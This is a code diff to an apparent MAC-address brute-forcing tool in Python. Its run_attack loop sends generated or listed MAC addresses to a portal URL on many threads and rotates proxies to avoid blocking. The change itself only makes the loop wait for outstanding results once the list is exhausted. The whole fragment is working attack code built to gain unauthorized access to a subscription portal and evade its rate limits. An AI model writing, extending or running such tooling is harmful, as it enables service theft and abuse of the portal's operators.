@@ -514,6 +514,7 @@ def run_attack(portal_id):
     
     with ThreadPoolExecutor(max_workers=speed) as executor:
         futures = {}
+        list_exhausted = False
         
         while state["running"]:
             while state["paused"] and state["running"]:
@@ -522,37 +523,46 @@ def run_attack(portal_id):
             if not state["running"]:
                 break
             
+            # Check if we should stop adding new MACs
             if mode == "list" and mac_list_index >= len(mac_list):
-                add_log(state, f"MAC list exhausted ({mac_list_index} tested). Attack complete.", "success")
-                break
+                if not list_exhausted:
+                    add_log(state, f"MAC list exhausted ({mac_list_index} submitted). Waiting for results...", "info")
+                    list_exhausted = True
+                # Don't break yet - wait for all futures to complete
+                if not futures:
+                    # All futures done
+                    break
             
-            while len(futures) < speed and state["running"]:
-                if mode == "list":
-                    if mac_list_index >= len(mac_list):
-                        break
-                    mac = mac_list[mac_list_index]
-                    mac_list_index += 1
-                    state["mac_list_index"] = mac_list_index
-                else:
-                    mac = generate_mac(mac_prefix)
-                
-                proxy = None
-                if proxies:
-                    working_proxies = [p for p in proxies if proxy_error_counts[p] < max_proxy_errors]
-                    if not working_proxies:
-                        proxy_error_counts.clear()
-                        working_proxies = proxies
-                    proxy = working_proxies[proxy_index % len(working_proxies)]
-                    proxy_index += 1
-                    state["current_proxy"] = proxy
-                
-                # Log that we're testing this MAC
-                proxy_info = f" via {proxy}" if proxy else ""
-                add_log(state, f"Testing {mac}{proxy_info}", "info")
-                
-                future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
-                futures[future] = (mac, proxy)
+            # Add new MACs to test (only if list not exhausted or random mode)
+            if not list_exhausted:
+                while len(futures) < speed and state["running"]:
+                    if mode == "list":
+                        if mac_list_index >= len(mac_list):
+                            break
+                        mac = mac_list[mac_list_index]
+                        mac_list_index += 1
+                        state["mac_list_index"] = mac_list_index
+                    else:
+                        mac = generate_mac(mac_prefix)
+                    
+                    proxy = None
+                    if proxies:
+                        working_proxies = [p for p in proxies if proxy_error_counts[p] < max_proxy_errors]
+                        if not working_proxies:
+                            proxy_error_counts.clear()
+                            working_proxies = proxies
+                        proxy = working_proxies[proxy_index % len(working_proxies)]
+                        proxy_index += 1
+                        state["current_proxy"] = proxy
+                    
+                    # Log that we're testing this MAC
+                    proxy_info = f" via {proxy}" if proxy else ""
+                    add_log(state, f"Testing {mac}{proxy_info}", "info")
+                    
+                    future = executor.submit(test_mac_worker, portal_url, mac, proxy, timeout)
+                    futures[future] = (mac, proxy)
             
+            # Process completed futures
             done_futures = [f for f in futures if f.done()]
             
             for future in done_futures:
